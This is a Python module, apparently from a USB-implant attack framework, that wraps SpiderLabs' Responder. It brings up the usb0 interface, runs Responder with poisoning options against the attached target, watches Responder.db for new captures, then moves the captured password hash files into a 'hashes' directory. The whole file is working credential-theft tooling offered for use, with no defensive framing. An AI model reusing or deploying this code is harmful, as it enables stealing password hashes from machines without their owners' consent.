import subprocess
import os
import time

from components.framework.Debug import Debug
from components.framework.network import FwComponentNetwork

network = FwComponentNetwork()

# TODO: FIX FILE PATHS FOR SUB-PROCESSES


class Responder(Debug):

    # Constructor
    def __init__(self, debug=False):
        super().__init__(name="Responder", type="Module", debug=debug)
        subprocess.run("mkdir -p ../hashes", shell=True)  # If the "hashes" directory doesn't exist, create it

    # Method used to capture password hashes from target using Spiderlabs' Responder
    def capture(self, timer):
        network.up()  # Up usb0
        process = subprocess.Popen("exec python ../components/modules/Responder/src/Responder.py -I usb0 -w -r -f",
                                   shell=True)  # Run Responder on usb0
        hash_success = monitor_responder(timer)  # Call method that will determine if hashes have been captured
        process.kill()  # Kill Responder
        network.down()  # Down usb0

        # Move txt files that contain the hashes to a more central directory (hashes directory)
        if hash_success:
            subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} ../hashes \;",
                       shell=True)

        return True


def monitor_responder(timer):  # "Stolen from PiKey"

    # Determine the last modified time of Responder.db
    timestamp_old = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
    time_to_run = time.time() + timer  # Set Responder "time to live"

    while time.time() < time_to_run:  # While running time < "time to live"
        timestamp_new = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
        if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
            time.sleep(2)
            return True

    return False

